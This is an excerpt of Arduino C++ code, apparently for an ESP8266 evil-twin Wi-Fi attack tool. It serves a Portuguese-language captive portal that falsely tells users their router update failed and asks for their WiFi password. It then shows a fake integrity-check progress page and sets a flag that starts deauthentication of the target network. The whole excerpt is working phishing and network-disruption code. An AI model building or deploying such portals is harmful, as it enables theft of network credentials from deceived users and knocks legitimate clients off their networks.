...
#define SUBTITLE "FALHA NO SISTEMA"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Falha na atualização do roteador!"
#define BODY "Houve um erro em seu roteador durante uma atualização!.<br><br>Para reiniciar o roteador e voltar ao modo padrão, insira a sua senha:"
...
String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>Senha WiFi:</label>" +
...
void handleResult() {
  ...
  if (WiFi.status() != WL_CONNECTED) {
    ...
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Senha incorreta</h2><p>Favor, tente novamente.</p></center></body> </html>");
...
void handleIndex() {
  ...
  if (hotspot_active == false) {
    ...
    if (webServer.hasArg("password")) {
      ...
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verificando integridade do sistema, por favor aguarde...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
      if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      }
    } else {
